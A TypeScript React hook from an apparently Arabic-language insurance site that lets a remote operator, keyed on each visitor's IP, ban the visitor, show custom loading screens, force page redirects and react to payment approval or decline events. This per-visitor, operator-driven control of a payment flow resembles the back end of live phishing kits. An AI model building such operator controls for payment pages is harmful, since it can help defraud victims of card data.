import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useSocketSync } from "./useSocketSync";

interface GuardState {
  loading: boolean;
  loadingText: string;
  loadingSubtext: string;
}

export function useVisitorGuard(visitorIp: string): GuardState {
  const [, navigate] = useLocation();
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("جاري التحميل...");
  const [loadingSubtext, setLoadingSubtext] = useState("يرجى الانتظار");

  // فحص الحظر عند التحميل
  const bannedQuery = trpc.insurance.checkBanned.useQuery(
    { ip: visitorIp },
    { enabled: !!visitorIp, refetchInterval: false, staleTime: 60000 }
  );

  // فحص شاشة التحميل عند التحميل
  const loadingQuery = trpc.insurance.getLoadingScreen.useQuery(
    { ip: visitorIp },
    { enabled: !!visitorIp, refetchInterval: false, staleTime: 30000 }
  );

  // فحص أوامر التوجيه المعلقة
  const navQuery = trpc.insurance.getPendingNav.useQuery(
    { ip: visitorIp },
    { enabled: !!visitorIp, refetchInterval: false, staleTime: 0 }
  );

  useEffect(() => {
    if (bannedQuery.data?.banned) {
      navigate("/banned");
    }
  }, [bannedQuery.data]);

  useEffect(() => {
    if (loadingQuery.data?.isActive) {
      setLoading(true);
      setLoadingText(loadingQuery.data.loadingText ?? "جاري التحميل...");
      setLoadingSubtext(loadingQuery.data.loadingSubtext ?? "يرجى الانتظار");
    }
  }, [loadingQuery.data]);

  useEffect(() => {
    if (navQuery.data?.page) {
      navigate(navQuery.data.page);
    }
  }, [navQuery.data]);

  // مزامنة Socket الفورية
  useSocketSync(visitorIp, {
    onBanned: () => navigate("/banned"),
    onNavigateTo: (page) => {
      if (page.includes("declined=true")) {
        // سيتم التعامل معها في صفحة الدفع
        navigate(page.split("?")[0]);
      } else {
        navigate(page);
      }
    },
    onLoadingScreen: (data) => {
      setLoading(data.isActive);
      setLoadingText(data.loadingText);
      setLoadingSubtext(data.loadingSubtext);
    },
    onPaymentApproved: () => {
      // إعادة فحص شاشة التحميل إذا فُوت الزائر إشعار socket
      loadingQuery.refetch();
    },
  });

  return { loading, loadingText, loadingSubtext };
}
